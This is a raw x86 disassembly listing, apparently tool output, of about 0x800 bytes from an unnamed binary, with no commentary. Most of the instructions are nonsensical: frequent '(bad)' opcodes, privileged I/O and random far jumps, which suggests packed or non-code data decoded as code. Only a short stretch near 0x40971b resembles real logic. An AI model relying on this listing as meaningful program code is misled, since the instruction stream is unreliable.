  40932c:	adc    DWORD PTR [ebx+0x35e31179],0xd376cd04
  409336:	sub    eax,0x251c408f
  40933b:	mov    es,WORD PTR [esp+esi*2+0x4]
  40933f:	jl     0x409376
  409341:	aaa    
  409342:	pop    esp
  409343:	push   es
  409344:	test   DWORD PTR [edi],ebx
  409346:	jmp    0xddc4:0x66bf010e
  40934d:	xchg   esp,eax
  40934e:	jp     0x409367
  409350:	lods   eax,DWORD PTR ds:[esi]
  409351:	jp     0x40931b
  409353:	fisubr WORD PTR [edx]
  409355:	mov    dl,0x73
  409357:	fldcw  WORD PTR [edi]
  409359:	adc    ebx,DWORD PTR [ecx]
  40935b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40935c:	add    al,0x38
  40935e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40935f:	add    al,BYTE PTR [edi+0x21]
  409362:	fdiv   QWORD PTR [esi+0x42]
  409365:	mov    esi,0xb110cd7c
  40936a:	sub    cl,BYTE PTR [ebp+0x54]
  40936d:	jnp    0x409329
  40936f:	into   
  409370:	jge    0x4093bc
  409372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409373:	jo     0x40933e
  409375:	mov    WORD PTR [ecx+0x7f],?
  409378:	add    BYTE PTR [ecx-0x3aedfb18],al
  40937e:	mov    dl,0xd0
  409380:	push   eax
  409381:	push   cs
  409382:	ror    BYTE PTR [ebx-0x78803431],cl
  409388:	pusha  
  409389:	mov    al,0x75
  40938b:	fdivr  QWORD PTR [esi+0x47533946]
  409391:	out    0x6f,eax
  409393:	adc    ebp,ecx
  409395:	test   al,0x8
  409397:	inc    eax
  409398:	mov    ebx,0x1da15f75
  40939d:	or     esi,DWORD PTR es:[ecx]
  4093a0:	retf   
  4093a1:	ret    
  4093a2:	ds xchg esi,eax
  4093a4:	lods   eax,DWORD PTR ds:[esi]
  4093a5:	fmul   DWORD PTR [ebx-0x5d]
  4093a8:	addr16 dec edx
  4093aa:	sub    ebp,DWORD PTR [esi]
  4093ac:	xchg   esi,eax
  4093ad:	stc    
  4093ae:	icebp  
  4093af:	or     al,0x15
  4093b1:	cmp    BYTE PTR [esi+eax*4-0x29],al
  4093b5:	add    cl,dh
  4093b7:	sub    al,0xa1
  4093b9:	jns    0x409343
  4093bb:	and    eax,0x8edf72b6
  4093c0:	iret   
  4093c1:	in     al,dx
  4093c2:	xchg   DWORD PTR [edi],edi
  4093c4:	adc    DWORD PTR [ecx+ebp*1-0x447a5b5f],esi
  4093cb:	inc    esi
  4093cc:	cwde   
  4093cd:	and    ebp,ecx
  4093cf:	(bad)  
  4093d0:	jb     0x40936d
  4093d2:	xchg   ecx,eax
  4093d3:	xchg   ebx,eax
  4093d4:	push   ecx
  4093d5:	and    eax,0xd0f65ecb
  4093da:	lea    eax,ds:0x5cf99397
  4093e0:	es pop ebx
  4093e2:	and    cl,BYTE PTR [eax-0x33159d16]
  4093e8:	aaa    
  4093e9:	out    0x17,eax
  4093eb:	add    eax,0x8b75e5e2
  4093f0:	les    ebp,FWORD PTR [edi+0x62]
  4093f3:	ds push 0xfd408e65
  4093f9:	clc    
  4093fa:	cmp    BYTE PTR [ebp-0x7e],dl
  4093fd:	call   0x547bcaec
  409402:	xor    eax,0xeaf704a2
  409407:	mov    esp,0xfb716d62
  40940c:	lods   al,BYTE PTR ds:[esi]
  40940d:	(bad)  
  40940e:	cwde   
  40940f:	ret    0x20aa
  409412:	dec    esp
  409413:	push   ss
  409414:	cs js  0x4093c6
  409417:	(bad)  
  409418:	jnp    0x40948b
  40941a:	sub    BYTE PTR [ecx+0x5d],0x5
  40941e:	jbe    0x4093c1
  409420:	bound  edx,QWORD PTR [eax-0x70e7f63c]
  409426:	not    BYTE PTR [edx]
  409428:	imul   edx,DWORD PTR [edx-0x38dc78d8],0x54fdaa44
  409432:	inc    ecx
  409433:	push   ebx
  409434:	ret    
  409435:	push   ds
  409436:	retf   0x428c
  409439:	mov    edx,0x88779b80
  40943e:	push   ds
  40943f:	sti    
  409440:	mov    esp,0xd9d673c
  409445:	mov    cl,0xda
  409447:	ja     0x409416
  409449:	mov    edx,eax
  40944b:	xchg   edi,eax
  40944c:	dec    edx
  40944d:	dec    esp
  40944e:	(bad)  
  40944f:	cwde   
  409450:	retf   
  409451:	imul   esi,eax,0x6
  409454:	sub    dl,BYTE PTR [esi]
  409456:	rcr    DWORD PTR [edx],0xad
  409459:	and    BYTE PTR [edi+0x54ee9534],0x60
  409460:	jl     0x4094ae
  409462:	test   eax,0x97e643ba
  409467:	imul   DWORD PTR [ebx-0x67]
  40946a:	jp     0x4094d6
  40946c:	call   FWORD PTR [ebp+0x57]
  40946f:	and    eax,0xd76c64a3
  409474:	arpl   WORD PTR [ecx-0x46],dx
  409477:	ror    BYTE PTR [esi-0x67b9d3f5],0xbb
  40947e:	sbb    eax,0xc83f99a0
  409483:	pop    ds
  409484:	fidiv  DWORD PTR [ebx+0x12f1cf1e]
  40948a:	jns    0x40941a
  40948c:	pop    edx
  40948d:	loope  0x409443
  40948f:	addr16 iret 
  409491:	pop    ds
  409492:	scas   eax,DWORD PTR es:[edi]
  409493:	add    al,0xf8
  409495:	xchg   ebp,eax
  409496:	mov    ds:0xd64da4e3,al
  40949b:	les    edx,FWORD PTR [edi]
  40949d:	(bad)  
  40949e:	sub    esi,DWORD PTR [eax-0x76]
  4094a1:	dec    edi
  4094a2:	dec    edi
  4094a3:	add    DWORD PTR [ebx],ecx
  4094a5:	call   0xd191:0x5ad1f3a1
  4094ac:	mov    ss,WORD PTR [ebx]
  4094ae:	pop    ebp
  4094af:	addr16 mov ds:0x59ec,eax
  4094b3:	or     eax,0x325dfd5e
  4094b8:	sbb    bl,BYTE PTR [edi+0x1ed0ee60]
  4094be:	pusha  
  4094bf:	push   0x24
  4094c1:	lods   al,BYTE PTR ds:[esi]
  4094c2:	arpl   WORD PTR [ebp+0xa],dx
  4094c5:	pop    eax
  4094c6:	mov    WORD PTR [eax-0x25b7db6b],cs
  4094cc:	int    0x1a
  4094ce:	add    esp,DWORD PTR [eax+0x72]
  4094d1:	mov    ds:0x59d26d32,eax
  4094d6:	jg     0x4094b8
  4094d8:	iret   
  4094d9:	or     DWORD PTR [edi+0x3],ebx
  4094dc:	sbb    al,0x23
  4094de:	mov    esp,0xd85df3e4
  4094e3:	inc    edi
  4094e4:	fidivr DWORD PTR [edi]
  4094e6:	jo     0x409491
  4094e8:	loope  0x4094ba
  4094ea:	xchg   ebp,eax
  4094eb:	popa   
  4094ec:	in     al,dx
  4094ed:	mov    edx,0x6bef6da1
  4094f2:	fcomp  DWORD PTR [ecx]
  4094f4:	jg     0x40947f
  4094f6:	push   ebx
  4094f7:	xchg   ecx,eax
  4094f8:	cmp    dl,cl
  4094fa:	imul   ebx,esi,0x55e5c9fb
  409500:	lds    ecx,FWORD PTR [ebp+0x2]
  409503:	mov    dh,0xb2
  409505:	push   esi
  409506:	sbb    eax,0x12a4ba4
  40950b:	scas   al,BYTE PTR es:[edi]
  40950c:	adc    edx,ebx
  40950e:	mov    al,ch
  409510:	stc    
  409511:	sub    esp,ebx
  409513:	mov    edx,0x2c576c83
  409518:	popf   
  409519:	mov    eax,ds:0x25d06616
  40951e:	fcomp  QWORD PTR [esi-0x70]
  409521:	rcr    BYTE PTR [esi-0xf],1
  409524:	pop    edi
  409525:	fxch   st(3)
  409527:	add    ebp,DWORD PTR [edi+0x2a6b8687]
  40952d:	push   ebx
  40952e:	data16 and bh,BYTE PTR [esp+ecx*4-0x13]
  409533:	jo     0x40958b
  409535:	xlat   BYTE PTR ds:[ebx]
  409536:	ret    
  409537:	sub    ah,BYTE PTR [ebx]
  409539:	test   DWORD PTR [edx+0x3b0dd1b9],eax
  40953f:	daa    
  409540:	ja     0x40959b
  409542:	cdq    
  409543:	mov    dl,0x31
  409545:	popa   
  409546:	aad    0x34
  409548:	ss mov ebp,0x8062bb03
  40954e:	xor    eax,0x343b51c7
  409553:	lock pushf 
  409555:	mov    BYTE PTR [esi+0x7c05e4b4],ch
  40955b:	xor    DWORD PTR [eax+0x71],edx
  40955e:	lods   eax,DWORD PTR ds:[esi]
  40955f:	adc    cl,al
  409561:	and    al,0x44
  409563:	and    eax,0xef80dbf0
  409568:	jae    0x40959e
  40956a:	fisttp WORD PTR [esi-0x46]
  40956d:	jnp    0x40955c
  40956f:	mov    ecx,0x8ee03ad2
  409574:	test   BYTE PTR [edx+0x65c5e188],ah
  40957a:	sub    BYTE PTR [ecx-0x6b70659],bl
  409580:	push   ecx
  409581:	xor    eax,0x6d2646e2
  409586:	shl    BYTE PTR [esi-0x34],cl
  409589:	push   esp
  40958a:	ins    DWORD PTR es:[edi],dx
  40958b:	or     al,0x6e
  40958d:	jge    0x4095f0
  40958f:	out    dx,eax
  409590:	inc    ebx
  409591:	jmp    FWORD PTR [esi]
  409593:	push   eax
  409594:	xor    al,BYTE PTR [eax]
  409596:	xor    eax,0x20cbe70b
  40959b:	inc    DWORD PTR [ebx-0x1a]
  40959e:	fild   WORD PTR ds:0x5884370f
  4095a4:	sbb    edi,esp
  4095a6:	repnz xlat BYTE PTR ds:[ebx]
  4095a8:	jnp    0x40952e
  4095aa:	ret    0x6c21
  4095ad:	fcom   QWORD PTR [eax]
  4095af:	mov    al,ds:0x2dbb0f6
  4095b4:	fidiv  WORD PTR [eax]
  4095b6:	mov    dl,0x12
  4095b8:	push   0x864e4a6a
  4095bd:	add    DWORD PTR [ecx],0xffffff86
  4095c0:	icebp  
  4095c1:	fwait
  4095c2:	repnz lds edi,FWORD PTR [ebx]
  4095c5:	sbb    DWORD PTR [esi+0x4b164ec3],0xffffffe4
  4095cc:	scas   eax,DWORD PTR es:[edi]
  4095cd:	ds icebp 
  4095cf:	(bad)  
  4095d0:	hlt    
  4095d1:	das    
  4095d2:	and    esi,eax
  4095d4:	jae    0x40960d
  4095d6:	jge    0x409602
  4095d8:	xchg   edx,eax
  4095d9:	mov    al,0x16
  4095db:	ja     0x4095b7
  4095dd:	imul   esi,ecx,0x24
  4095e0:	inc    esp
  4095e1:	xchg   edx,eax
  4095e2:	faddp  st(3),st
  4095e4:	jg     0x40965e
  4095e6:	cmp    al,0x2c
  4095e8:	je     0x409619
  4095ea:	ins    DWORD PTR es:[edi],dx
  4095eb:	cmp    DWORD PTR [edi+0x220943e3],eax
  4095f1:	scas   al,BYTE PTR es:[edi]
  4095f2:	aas    
  4095f3:	sbb    BYTE PTR [ebp+0x51],al
  4095f6:	lods   al,BYTE PTR ds:[esi]
  4095f7:	and    BYTE PTR [edi-0x4b],dh
  4095fa:	inc    esp
  4095fb:	into   
  4095fc:	repnz mov es,WORD PTR [ebp+0x676472b6]
  409603:	in     eax,dx
  409604:	out    0x77,al
  409606:	out    0x16,al
  409608:	inc    esi
  409609:	cmp    bh,bl
  40960b:	ret    
  40960c:	adc    ecx,edi
  40960e:	sar    DWORD PTR [ebp-0x7ccae729],1
  409614:	out    dx,al
  409615:	rol    esp,1
  409617:	int    0x10
  409619:	hlt    
  40961a:	cs push cs
  40961c:	push   es
  40961d:	mov    ecx,0x83f72acd
  409622:	jno    0x409617
  409624:	dec    esi
  409625:	lds    esi,FWORD PTR [ebx+0x6ef7a646]
  40962b:	fs pop ecx
  40962d:	in     al,0x79
  40962f:	jnp    0x409611
  409631:	cli    
  409632:	push   ebx
  409633:	fucomip st,st(6)
  409635:	sti    
  409636:	fild   WORD PTR [esi-0x51da80de]
  40963c:	lds    ebx,FWORD PTR [esi-0x26ff5119]
  409642:	fldl2e 
  409644:	out    dx,al
  409645:	cmp    eax,0x629b17b8
  40964a:	inc    esi
  40964b:	repz fild QWORD PTR [edx+0xa]
  40964f:	adc    esp,DWORD PTR [ebx]
  409651:	lods   eax,DWORD PTR ds:[esi]
  409652:	lea    esp,[eax+0x70297d2f]
  409658:	adc    DWORD PTR ds:0x738a47,0xffffffa0
  40965f:	jmp    DWORD PTR [ebx-0x68]
  409662:	adc    eax,0x39fea0f5
  409667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409668:	xor    eax,0x6e77a830
  40966d:	clc    
  40966e:	dec    ebp
  40966f:	mov    ecx,0x3d887cab
  409674:	mov    ecx,0xbb3402d5
  409679:	cmp    ch,BYTE PTR [ebx]
  40967b:	xchg   ebp,eax
  40967c:	fisttp DWORD PTR ds:0x6e369997
  409682:	and    esi,edi
  409684:	std    
  409685:	mov    al,0xa5
  409687:	pop    ebp
  409688:	les    esi,FWORD PTR [eax+0x26]
  40968b:	inc    eax
  40968c:	sti    
  40968d:	pmuludq mm4,QWORD PTR ds:0xf5df7b8e
  409694:	and    al,0x2d
  409696:	repz test bh,ch
  409699:	add    BYTE PTR [esp+eax*1],dl
  40969c:	jp     0x409700
  40969e:	xor    al,0x55
  4096a0:	lea    esi,[ecx-0x4c74aacb]
  4096a6:	jle    0x4096d5
  4096a8:	or     eax,0x28c9a935
  4096ad:	jmp    0xf2d0511a
  4096b2:	hlt    
  4096b3:	jmp    0x409691
  4096b5:	sub    ah,bl
  4096b7:	lea    esp,[ecx+0x52]
  4096ba:	jbe    0x4096ae
  4096bc:	mov    al,ds:0x34f5bd6e
  4096c1:	pop    esp
  4096c2:	enter  0x8983,0xed
  4096c6:	sti    
  4096c7:	xor    dh,BYTE PTR [esp+ebx*4+0x6f87aa83]
  4096ce:	cld    
  4096cf:	push   ss
  4096d0:	jb     0x409663
  4096d2:	add    BYTE PTR [eax-0x2],bh
  4096d5:	jle    0x4096f6
  4096d7:	mov    esi,0x2b2f9ddf
  4096dc:	jge    0x409712
  4096de:	ficom  WORD PTR [eax]
  4096e0:	scas   al,BYTE PTR es:[edi]
  4096e1:	cli    
  4096e2:	jp     0x40973f
  4096e4:	push   0xffffff9e
  4096e6:	cmc    
  4096e7:	lds    esp,FWORD PTR ds:0xd2ef06d4
  4096ed:	(bad)  
  4096ee:	mov    ebx,0xc3cc942f
  4096f3:	and    DWORD PTR [ecx-0x46],ecx
  4096f6:	add    eax,0xd0c7bf65
  4096fb:	gs mov esi,0xaa1562a3
  409701:	jge    0x40974d
  409703:	xchg   esp,eax
  409704:	es sti 
  409706:	dec    edi
  409707:	mov    cl,0x5a
  409709:	das    
  40970a:	mov    ebx,DWORD PTR [ebp+0x73faa3dd]
  409710:	test   al,0x87
  409712:	stos   BYTE PTR es:[edi],al
  409713:	scas   eax,DWORD PTR es:[edi]
  409714:	jae    0x4096eb
  409716:	mov    esp,0x126bdd80
  40971b:	mov    eax,DWORD PTR [ebp+0x8]
  40971e:	mov    edi,DWORD PTR ds:0x43460f
  409724:	or     DWORD PTR ds:0x434613,edi
  40972a:	mov    DWORD PTR [ebp+0x8],0xf89c8536
  409731:	xor    edi,0x551
  409737:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40973e:	movzx  ecx,WORD PTR ds:0x4344f3
  409745:	add    ecx,DWORD PTR ds:0x434537
  40974b:	mov    DWORD PTR ds:0x4344f3,ecx
  409751:	mov    edx,DWORD PTR [ebp+0x8]
  409754:	jmp    0x409b6b
  409759:	jmp    0x409767
  40975b:	or     al,0xd8
  40975d:	std    
  40975e:	fdiv   st,st(3)
  409760:	sbb    eax,0x3c00db39
  409765:	retf   0x25e0
  409768:	dec    ebx
  409769:	xchg   esp,eax
  40976a:	out    dx,al
  40976b:	jle    0x4097eb
  40976d:	jo     0x4097e8
  40976f:	jle    0x4097ef
  409771:	into   
  409772:	imul   edi,DWORD PTR [ebx+0x58],0xffffffa2
  409776:	lods   eax,DWORD PTR ds:[esi]
  409777:	xchg   edi,eax
  409778:	xor    bl,BYTE PTR ds:0x549a53fa
  40977e:	mov    ds:0x6853196,eax
  409783:	loopne 0x4097d0
  409785:	push   ebp
  409786:	in     al,dx
  409787:	mov    dh,0x90
  409789:	call   0x6737d607
  40978e:	mov    ecx,0xd883a2e4
  409793:	and    DWORD PTR [bp+si-0x1],ecx
  409797:	leave  
  409798:	cmp    BYTE PTR [ecx+0xc63d469],cl
  40979e:	out    dx,al
  40979f:	adc    al,0x4a
  4097a1:	sbb    al,0x2
  4097a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097a4:	enter  0x3eef,0x7d
  4097a8:	xchg   esp,eax
  4097a9:	aaa    
  4097aa:	js     0x409742
  4097ac:	cli    
  4097ad:	fcomp  QWORD PTR [ebx-0x52]
  4097b0:	cmp    al,0xd4
  4097b2:	cmp    al,0x93
  4097b4:	mov    cs,WORD PTR [ecx-0x59]
  4097b7:	(bad)  
  4097b9:	pop    ss
  4097ba:	rcl    DWORD PTR [esi-0x1],0x53
  4097be:	cmp    BYTE PTR ds:0x4c33e439,al
  4097c4:	imul   edx,DWORD PTR [edx-0x7f],0x18a03a
  4097cb:	in     al,dx
  4097cc:	aaa    
  4097cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097ce:	adc    DWORD PTR [edx-0x2aad1f09],edi
  4097d4:	push   esi
  4097d5:	jge    0x409780
  4097d7:	idiv   BYTE PTR [esi+0x9]
  4097da:	aad    0x63
  4097dc:	mov    BYTE PTR ds:0xda410246,cl
  4097e2:	pop    ds
  4097e3:	add    esi,DWORD PTR [edx+edi*4+0x37951c18]
  4097ea:	loop   0x409774
  4097ec:	and    BYTE PTR [edx-0x20ca5d05],cl
  4097f2:	cmp    ebx,DWORD PTR [edi-0x619ce313]
  4097f8:	xor    BYTE PTR [ebx+esi*1-0x7b],ch
  4097fc:	jl     0x40986f
  4097fe:	jb     0x409820
  409800:	(bad)  
  409801:	mov    al,0x3c
  409803:	add    BYTE PTR [ebx+ebx*2-0x293c7b47],0xee
  40980b:	(bad)  
  40980c:	mov    bl,0x82
  40980e:	js     0x4097f4
  409810:	(bad)  
  409811:	mov    bh,0xdc
  409813:	(bad)  
  409814:	rcr    DWORD PTR [eax+edx*1+0x1717f3d],1
  40981b:	push   ebx
  40981c:	or     DWORD PTR [eax],0xffffffc4
  40981f:	bound  ecx,QWORD PTR gs:[edi]
  409822:	fldenv [edi-0x13]
  409825:	mov    esp,0xc9309da0
  40982a:	mov    ecx,0x2b22a64d
  40982f:	xor    BYTE PTR [eax-0x2ccd1761],0x4
  409836:	inc    edi
  409837:	loope  0x40989c
  409839:	xchg   esp,eax
  40983a:	adc    eax,0x747faf39
  40983f:	sahf   
  409840:	gs sti 
  409842:	loop   0x4098b2
  409844:	pop    ebp
  409845:	arpl   bx,dx
  409847:	push   ss
  409848:	mov    ah,0x60
  40984a:	(bad)  
  40984b:	arpl   WORD PTR [esi+0x7f],dx
  40984e:	nop
  40984f:	scas   al,BYTE PTR es:[edi]
  409850:	mov    ah,0x52
  409852:	adc    BYTE PTR [edx-0x16b0f0fd],0xdc
  409859:	add    eax,0x2a0677b8
  40985e:	(bad)  
  40985f:	leave  
  409860:	dec    esp
  409861:	fsubr  DWORD PTR [ecx-0x37]
  409864:	js     0x4098c5
  409866:	(bad)  
  409867:	xor    al,0x6c
  409869:	mov    eax,DWORD PTR gs:[edx+ebp*1+0x4278f17c]
  409871:	arpl   dx,bx
  409873:	ins    BYTE PTR es:[edi],dx
  409874:	dec    ecx
  409875:	stc    
  409876:	adc    esp,DWORD PTR [esp+edi*4]
  409879:	lods   al,BYTE PTR ds:[esi]
  40987a:	add    al,0xdd
  40987c:	mov    ecx,0xccc5aa86
  409881:	mov    bx,?
  409884:	and    esi,ebp
  409886:	jle    0x409851
  409888:	mov    ah,0x20
  40988a:	repnz popa 
  40988c:	arpl   WORD PTR [ebx+0x17],cx
  40988f:	je     0x40986f
  409891:	call   0x791f:0xf8382097
  409898:	xor    al,0xe9
  40989a:	stc    
  40989b:	mov    esi,0xb4253791
  4098a0:	dec    ecx
  4098a1:	retf   0x25b2
  4098a4:	jl     0x4098b9
  4098a6:	jmp    0x4098da
  4098a8:	fnstsw WORD PTR [edx-0x1c]
  4098ab:	hlt    
  4098ac:	mov    DWORD PTR [edx+0x40d433c6],edi
  4098b2:	adc    edi,ebp
  4098b4:	imul   esi,DWORD PTR [esi],0xfffffffd
  4098b7:	(bad)  
  4098b8:	in     eax,dx
  4098b9:	push   ebx
  4098ba:	gs xor al,0xdc
  4098bd:	imul   esp,ecx,0x73baa8fe
  4098c3:	mov    al,ds:0x24cb81dc
  4098c8:	add    al,0x4
  4098ca:	retf   0xc2fb
  4098cd:	shl    BYTE PTR ss:0x2955d0fb,1
  4098d4:	arpl   sp,ax
  4098d6:	fnstcw WORD PTR [ebp-0x61]
  4098d9:	push   es
  4098da:	adc    ah,dl
  4098dc:	(bad)  
  4098dd:	cli    
  4098de:	je     0x4098ab
  4098e0:	imul   esi,DWORD PTR [ebx+0x40a918f4],0x866cee11
  4098ea:	mov    edi,0xad8baf05
  4098f0:	jne    0x4098b3
  4098f2:	ds int3 
  4098f4:	push   edx
  4098f5:	sub    BYTE PTR [esi],dl
  4098f7:	pop    esi
  4098f8:	iret   
  4098f9:	pushf  
  4098fa:	pop    edi
  4098fb:	int    0x53
  4098fd:	rol    BYTE PTR [ebx+0x39892572],1
  409903:	daa    
  409904:	cmp    DWORD PTR [edx+0x7f],0xffffffd8
  409908:	cmp    dl,ch
  40990a:	ds adc al,0x19
  40990d:	mov    ebp,0x55106041
  409912:	xor    DWORD PTR [edi+0x19],esi
  409915:	mov    BYTE PTR [ebx+edi*1-0x1d59431d],bl
  40991c:	and    ch,BYTE PTR [ebp+0x2e]
  40991f:	enter  0x7d9e,0xcc
  409923:	mov    esi,0x3aa70696
  409928:	es inc edx
  40992a:	adc    BYTE PTR [edi+0x5b7b3531],bl
  409930:	sub    edx,0x617cd237
  409936:	dec    ebp
  409937:	aam    0xc9
  409939:	pushf  
  40993a:	or     DWORD PTR [ecx+0x46],esi
  40993d:	or     DWORD PTR [ebp+0x364dc28a],esp
  409943:	add    eax,0xc512188c
  409948:	lds    esi,FWORD PTR [ebx]
  40994a:	test   BYTE PTR [edi-0x6e],ch
  40994d:	rcr    BYTE PTR [ebp-0x4be4f3d0],cl
  409953:	in     eax,0x95
  409955:	xor    eax,DWORD PTR [esi+0x42]
  409958:	(bad)  
  409959:	stos   DWORD PTR es:[edi],eax
  40995a:	ss fmulp st(5),st
  40995d:	jno    0x40991f
  40995f:	test   eax,0x58a85e64
  409964:	mov    ebp,0x674a4d25
  409969:	push   edx
  40996a:	mov    WORD PTR [ecx+0x30],?
  40996d:	jmp    0x11ac070b
  409972:	inc    eax
  409973:	dec    ebx
  409974:	(bad)  
  409975:	and    al,0x86
  409977:	pop    edi
  409978:	in     eax,dx
  409979:	ja     0x409949
  40997b:	loop   0x40991c
  40997d:	shl    DWORD PTR [ecx+0x3e20dbb1],1
  409983:	mov    ds:0x3bfa60dc,eax
  409988:	push   esp
  409989:	outs   dx,DWORD PTR ds:[esi]
  40998a:	fwait
  40998b:	out    dx,al
  40998c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40998d:	test   esi,ebx
  40998f:	aas    
  409990:	or     eax,0xf0e8b1cd
  409995:	fistp  DWORD PTR [esp+edx*1+0x27988512]
  40999c:	xchg   edx,eax
  40999d:	stos   DWORD PTR es:[edi],eax
  40999e:	(bad)  
  40999f:	repnz fisttp DWORD PTR [esi]
  4099a2:	fcom   QWORD PTR [ebp+0xb]
  4099a5:	(bad)  
  4099a6:	stos   DWORD PTR es:[edi],eax
  4099a7:	dec    ebp
  4099a8:	fld    DWORD PTR [esi-0x78]
  4099ab:	lea    edx,[ecx]
  4099ad:	(bad)  
  4099af:	add    eax,DWORD PTR [ebx+0x3fc5d7a2]
  4099b5:	mov    bh,0x12
  4099b7:	push   ds
  4099b8:	push   0xffffffb6
  4099ba:	push   edi
  4099bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099bc:	rcl    BYTE PTR [edx+ebp*8-0x9],0xe0
  4099c1:	mov    eax,0xe840dfc6
  4099c6:	aaa    
  4099c7:	mov    edi,0x6b882d10
  4099cc:	push   es
  4099cd:	or     al,0x2a
  4099cf:	jbe    0x4099bd
  4099d1:	inc    edi
  4099d2:	and    DWORD PTR [edx],edx
  4099d4:	mov    bh,0x9
  4099d6:	daa    
  4099d7:	sub    eax,0x48ac7aac
  4099dc:	lds    edx,FWORD PTR [ebp+0x39b2abc6]
  4099e2:	je     0x40999b
  4099e4:	mov    eax,ds:0xf19bea3a
  4099e9:	outs   dx,DWORD PTR ds:[esi]
  4099ea:	rcr    DWORD PTR [edx-0x44],1
  4099ed:	adc    DWORD PTR [ecx-0x43],ebx
  4099f0:	cmc    
  4099f1:	outs   dx,DWORD PTR ds:[esi]
  4099f2:	cli    
  4099f3:	xlat   BYTE PTR ds:[ebx]
  4099f4:	xor    dl,ah
  4099f6:	mov    ds:0x7acb8007,al
  4099fb:	cmp    BYTE PTR [edx-0x38],al
  4099fe:	imul   esp
  409a00:	into   
  409a01:	int3   
  409a02:	push   ebp
  409a03:	add    eax,0xe971d7cb
  409a08:	push   ss
  409a09:	rcr    DWORD PTR [esi-0x369373f],0xbc
  409a10:	jmp    0xa95e:0xfdac2a9d
  409a17:	cld    
  409a18:	ret    0xe80f
  409a1b:	mov    bl,0x91
  409a1d:	push   cs
  409a1e:	aam    0xc1
  409a20:	stc    
  409a21:	sbb    al,0x66
  409a23:	jns    0x409a11
  409a25:	stos   BYTE PTR es:[edi],al
  409a26:	and    bh,BYTE PTR [esi-0x60]
  409a29:	xor    ax,0xb393
  409a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a2e:	aaa    
  409a2f:	lods   al,BYTE PTR ds:[esi]
  409a30:	pushf  
  409a31:	sbb    eax,0xe977dbe9
  409a36:	sbb    esi,ebx
  409a38:	add    eax,0xf3879e3d
  409a3d:	loope  0x409a93
  409a3f:	sti    
  409a40:	sub    dl,BYTE PTR [ecx+0x2d58ce4b]
  409a46:	pusha  
  409a47:	cld    
  409a48:	lods   al,BYTE PTR ds:[esi]
  409a49:	fcom   DWORD PTR [edi]
  409a4b:	xchg   edi,eax
  409a4c:	fwait
  409a4d:	lea    edi,[edx]
  409a4f:	jge    0x409a8b
  409a51:	and    DWORD PTR [edi],0x57521c0e
  409a57:	paddsb mm6,QWORD PTR [ebp+0xacd202]
  409a5e:	dec    esp
  409a5f:	and    BYTE PTR [edx],0x4f
  409a62:	push   0xbbce2c15
  409a67:	add    eax,0xd9d310d5
  409a6c:	sbb    DWORD PTR [edi+0x50],esi
  409a6f:	cwde   
  409a70:	mov    bh,0x67
  409a72:	shr    DWORD PTR [esp+ebx*8+0x45],1
  409a76:	push   esi
  409a77:	neg    BYTE PTR [esi+0x32]
  409a7a:	pop    es
  409a7b:	add    dl,BYTE PTR [eax]
  409a7d:	(bad)  
  409a7f:	fadd   DWORD PTR [ebp-0x6c947ac8]
  409a85:	xlat   BYTE PTR ds:[ebx]
  409a86:	dec    ebx
  409a87:	lock repnz in eax,0x40
  409a8b:	add    BYTE PTR [edi+0x1503fbab],cl
  409a91:	adc    al,0x3
  409a93:	push   esp
  409a94:	mov    DWORD PTR [esi-0x6d],esp
  409a97:	icebp  
  409a98:	fstp   TBYTE PTR [ecx]
  409a9a:	pop    eax
  409a9b:	dec    ebx
  409a9c:	pop    eax
  409a9d:	pop    ds
  409a9e:	test   eax,0xb4f9ff45
  409aa3:	shl    DWORD PTR [edx],1
  409aa5:	shl    BYTE PTR [ebx+0x4b],0x37
  409aa9:	dec    eax
  409aaa:	pop    ebp
  409aab:	xchg   ebp,eax
  409aac:	pop    edx
  409aad:	unpckhps xmm6,XMMWORD PTR [ecx]
  409ab0:	retf   0xc776
  409ab3:	sub    DWORD PTR [eax+0x5d],0xffffffb4
  409ab7:	aad    0x18
  409ab9:	pop    edi
  409aba:	test   bl,ah
  409abc:	loop   0x409ac3
  409abe:	dec    ebx
  409abf:	mov    dl,0xfb
  409ac1:	imul   edi
  409ac3:	pop    ds
  409ac4:	sbb    al,0x71
  409ac6:	repnz fcomp QWORD PTR cs:[edi]
  409aca:	mov    ah,0x53
  409acc:	into   
  409acd:	pop    edx
  409ace:	std    
  409acf:	shl    BYTE PTR [edi-0xa],0xc6
  409ad3:	(bad)  
  409ad5:	mov    edi,0x28eb164e
  409ada:	imul   esi,DWORD PTR [ebp-0x5332e803],0x35
  409ae1:	jo     0x409aae
  409ae3:	jns    0x409b0b
  409ae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ae6:	sti    
  409ae7:	cmp    al,0xc2
  409ae9:	or     dh,ch
  409aeb:	mov    ds:0x2c0f1584,al
  409af0:	adc    al,0x8c
  409af2:	jb     0x409ae0
  409af4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409af5:	lods   al,BYTE PTR ds:[esi]
  409af6:	mov    dl,0xb7
  409af8:	sub    al,0xa7
  409afa:	mov    ds:0xbac16220,al
  409aff:	retf   0x453a
  409b02:	inc    edx
  409b03:	movaps xmm7,XMMWORD PTR [ecx-0x4b851082]
  409b0a:	shl    BYTE PTR [ebp+0x4d3b79a4],0xa9
  409b11:	xchg   esp,eax
  409b12:	test   edi,esp
  409b14:	das    
  409b15:	mov    edi,DWORD PTR [esi+0x2870195]
  409b1b:	stos   DWORD PTR es:[edi],eax
  409b1c:	out    0x6c,al
  409b1e:	mov    ebx,0xb2fcfcdd
  409b23:	cmp    eax,0xd430b5b8
  409b28:	(bad)  
  409b29:	(bad)  
  409b2b:	xlat   BYTE PTR ds:[ebx]
  409b2c:	retf   0x2456
  409b2f:	lods   al,BYTE PTR ds:[esi]
  409b30:	dec    ecx
  409b31:	mov    fs,WORD PTR [ebx]
  409b33:	pop    ds
  409b34:	mov    gs,edx
  409b36:	push   esp
  409b37:	mov    ebx,0x6bb6e34b
  409b3c:	jg     0x409b0a
